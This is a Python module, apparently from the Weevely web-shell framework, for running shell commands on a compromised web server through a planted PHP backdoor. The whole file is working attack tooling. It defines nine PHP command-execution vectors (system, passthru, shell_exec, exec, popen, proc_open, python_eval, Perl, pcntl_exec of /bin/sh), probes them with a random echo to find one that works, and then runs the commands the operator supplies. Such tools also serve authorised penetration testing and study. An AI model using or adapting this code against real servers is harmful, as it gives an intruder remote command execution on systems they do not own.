from core.vector import PhpCmd
from core.module import Module, Status
from core.loggers import log
from core.utilities import Os
from core import messages
from core import modules
import random

class Sh(Module):

    """Execute Shell commands."""

    def init(self):

        self._register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self._register_arguments(
            # Declare mandatory arguments
            mandatory = [
                'command'
            ],
            # Declare additional options
            optional = {
                'stderr_redirection': ' 2>&1',
                'vector': ''
            },
            bind_to_vectors = 'vector')

        self._register_vectors(
            [
            # All the system-like calls has to be properly wrapped between single quotes
            PhpCmd("""@system('${args['command']}${args['stderr_redirection']}');""", "system"),
            PhpCmd("""@passthru('${args['command']}${args['stderr_redirection']}');""", "passthru"),
            PhpCmd("""print(@shell_exec('${args['command']}${args['stderr_redirection']}'));""", "shell_exec"),
            PhpCmd("""$r=array(); @exec('${args['command']}${args['stderr_redirection']}', $r);print(join(\"\\n\",$r));""", "exec"),
            PhpCmd("""$h=@popen('${args['command']}','r'); if($h) { while(!feof($h)) echo(fread($h,4096)); pclose($h); }""", "popen"),
            PhpCmd("""$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));$h = @proc_open('${args['command']}', $p, $pipes); if($h&&$pipes) { while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);fclose($pipes[2]); proc_close($h); }""", "proc_open"),
            PhpCmd("""@python_eval('import os; os.system('${args['command']}${args['stderr_redirection']}');');""", "python_eval"),
            PhpCmd("""if(class_exists('Perl')) { $perl = new Perl(); $r = $perl->system('${args['command']}${args['stderr_redirection']}');print($r);}""", "perl_system"),
            # pcntl_fork is unlikely, cause is callable just as CGI or from CLI.
            PhpCmd("""$p=@pcntl_fork(); if(!$p){@pcntl_exec("/bin/sh",Array("-c",'${args['command']}'));} else {@pcntl_waitpid($p,$status);}""",
                name="pcntl", target=Os.NIX),
            ])

    def setup(self, args={}):
        """Probe all vectors to find a working system-like function.

        The method run_until is not used due to the check of shell_sh
        enabling for every tested vector.

        Args:
            args: The dictionary of arguments

        Returns:
            Returns true or false if the module is enable or not.

        """

        check_digits = str(random.randint(11111, 99999))

        args_check = { 'args' : {
                            'command': 'echo %s' % check_digits,
                            'stderr_redirection': ''
                        }
                    }

        (vector_name,
         result) = self.vectors.find_first_result(
          names = [ args.get('vector', '') ],
            arguments = args_check,
            condition = lambda result: (
                # Stop if shell_php is in FAIL state
                self.session['shell_php']['status'] == Status.FAIL or
                # Or if the result is correct
                self.session['shell_php']['status'] == Status.RUN and result == check_digits
                )
            )

        if self.session['shell_php']['status'] == Status.RUN and result == check_digits:
            self.session['shell_sh']['stored_args']['vector'] = vector_name
            return True
        else:
            return False

    def run(self, args):

        # Escape the single quotes. This does not protect from \' but
        # avoid to break the query for an unscaped quote.

        args['command'] = args['command'].replace("'", "\\'")

        return self.vectors.get_result(
         name = args['vector'],
         arguments = { 'args' : args }
        )
